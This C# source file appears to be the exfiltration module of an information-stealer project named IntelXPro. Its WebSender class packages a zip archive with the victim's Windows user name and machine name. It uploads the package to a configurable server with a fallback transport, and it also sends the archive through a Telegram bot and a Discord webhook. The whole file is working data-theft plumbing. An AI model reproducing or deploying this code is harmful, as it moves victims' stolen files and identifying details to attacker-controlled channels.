using System;
using System.IO;
using System.Net.Http;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Dependencies.General
{
    internal static class WebSender
    {
        public static async Task<bool> SendToServer(byte[] zipData, string fileName, string serverUrl)
        {
            try
            {
                if (string.IsNullOrEmpty(serverUrl))
                    return false;

                return await SendWithHttpClient(zipData, fileName, serverUrl);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[DEBUG] Primary upload failed: {ex.Message}");
                try
                {
                    return SendWithWebRequest(zipData, fileName, serverUrl);
                }
                catch (Exception ex2)
                {
                    Console.WriteLine($"[DEBUG] Fallback upload failed: {ex2.Message}");
                    return false;
                }
            }
        }

        private static async Task<bool> SendWithHttpClient(byte[] zipData, string fileName, string serverUrl)
        {
            using (var client = new HttpClient())
            {
                client.Timeout = TimeSpan.FromMinutes(5);
                
                var boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
                var content = new MultipartFormDataContent(boundary);
                
                content.Add(new StringContent(fileName), "filename");
                content.Add(new StringContent(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")), "timestamp");
                content.Add(new StringContent(Environment.UserName), "username");
                content.Add(new StringContent(Environment.MachineName), "machinename");
                
                var fileContent = new ByteArrayContent(zipData);
                fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/zip");
                content.Add(fileContent, "file", fileName);

                Console.WriteLine($"[DEBUG] HttpClient - Uploading to: {serverUrl}");
                Console.WriteLine($"[DEBUG] HttpClient - File size: {zipData.Length} bytes");
                
                var response = await client.PostAsync(serverUrl, content);
                
                Console.WriteLine($"[DEBUG] HttpClient - Response status: {response.StatusCode}");
                
                if (!response.IsSuccessStatusCode)
                {
                    var responseContent = await response.Content.ReadAsStringAsync();
                    Console.WriteLine($"[DEBUG] HttpClient - Response content: {responseContent}");
                }
                
                return response.IsSuccessStatusCode;
            }
        }

        private static bool SendWithWebRequest(byte[] zipData, string fileName, string serverUrl)
        {
            var boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
            var request = (HttpWebRequest)WebRequest.Create(serverUrl);
            request.Method = "POST";
            request.ContentType = $"multipart/form-data; boundary={boundary}";
            request.Timeout = 300000;

            Console.WriteLine($"[DEBUG] WebRequest - Uploading to: {serverUrl}");
            Console.WriteLine($"[DEBUG] WebRequest - File size: {zipData.Length} bytes");

            using (var requestStream = request.GetRequestStream())
            {
                var formData = BuildMultipartFormData(zipData, fileName, boundary);
                requestStream.Write(formData, 0, formData.Length);
            }

            using (var response = (HttpWebResponse)request.GetResponse())
            {
                Console.WriteLine($"[DEBUG] WebRequest - Response status: {response.StatusCode}");
                
                using (var responseStream = response.GetResponseStream())
                using (var reader = new StreamReader(responseStream))
                {
                    var responseContent = reader.ReadToEnd();
                    Console.WriteLine($"[DEBUG] WebRequest - Response content: {responseContent}");
                }
                
                return response.StatusCode == HttpStatusCode.OK;
            }
        }

        private static byte[] BuildMultipartFormData(byte[] zipData, string fileName, string boundary)
        {
            var formData = new StringBuilder();
            var encoding = Encoding.UTF8;

            formData.AppendLine($"--{boundary}");
            formData.AppendLine("Content-Disposition: form-data; name=\"filename\"");
            formData.AppendLine();
            formData.AppendLine(fileName);

            formData.AppendLine($"--{boundary}");
            formData.AppendLine("Content-Disposition: form-data; name=\"timestamp\"");
            formData.AppendLine();
            formData.AppendLine(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));

            formData.AppendLine($"--{boundary}");
            formData.AppendLine("Content-Disposition: form-data; name=\"username\"");
            formData.AppendLine();
            formData.AppendLine(Environment.UserName);

            formData.AppendLine($"--{boundary}");
            formData.AppendLine("Content-Disposition: form-data; name=\"machinename\"");
            formData.AppendLine();
            formData.AppendLine(Environment.MachineName);

            formData.AppendLine($"--{boundary}");
            formData.AppendLine($"Content-Disposition: form-data; name=\"file\"; filename=\"{fileName}\"");
            formData.AppendLine("Content-Type: application/zip");
            formData.AppendLine();

            var headerBytes = encoding.GetBytes(formData.ToString());
            var footerBytes = encoding.GetBytes($"\r\n--{boundary}--\r\n");

            var result = new byte[headerBytes.Length + zipData.Length + footerBytes.Length];
            Array.Copy(headerBytes, 0, result, 0, headerBytes.Length);
            Array.Copy(zipData, 0, result, headerBytes.Length, zipData.Length);
            Array.Copy(footerBytes, 0, result, headerBytes.Length + zipData.Length, footerBytes.Length);

            return result;
        }

        public static async Task<bool> SendToTelegram(byte[] zipData, string fileName, string botToken, string chatId)
        {
            try
            {
                if (string.IsNullOrEmpty(botToken) || string.IsNullOrEmpty(chatId))
                    return false;

                using (var client = new HttpClient())
                {
                    client.Timeout = TimeSpan.FromMinutes(5);
                    
                    var content = new MultipartFormDataContent();
                    content.Add(new StringContent(chatId), "chat_id");
                    content.Add(new StringContent($"{DateTime.Now:yyyy-MM-dd HH:mm:ss}"), "caption");
                    
                    var fileContent = new ByteArrayContent(zipData);
                    fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/zip");
                    content.Add(fileContent, "document", fileName);

                    string url = $"https://api.telegram.org/bot{botToken}/sendDocument";
                    var response = await client.PostAsync(url, content);
                    
                    return response.IsSuccessStatusCode;
                }
            }
            catch
            {
                return false;
            }
        }

        public static async Task<bool> SendToDiscord(byte[] zipData, string fileName, string webhookUrl)
        {
            try
            {
                if (string.IsNullOrEmpty(webhookUrl))
                    return false;

                using (var client = new HttpClient())
                {
                    client.Timeout = TimeSpan.FromMinutes(5);
                    
                    var content = new MultipartFormDataContent();
                    
                    string jsonPayload = $@"{{
                        ""content"": ""`{DateTime.Now:yyyy-MM-dd HH:mm:ss}`""
                    }}";
                    
                    content.Add(new StringContent(jsonPayload, Encoding.UTF8, "application/json"), "payload_json");
                    
                    var fileContent = new ByteArrayContent(zipData);
                    fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/zip");
                    content.Add(fileContent, "file", fileName);

                    var response = await client.PostAsync(webhookUrl, content);
                    
                    return response.IsSuccessStatusCode;
                }
            }
            catch
            {
                return false;
            }
        }
    }
}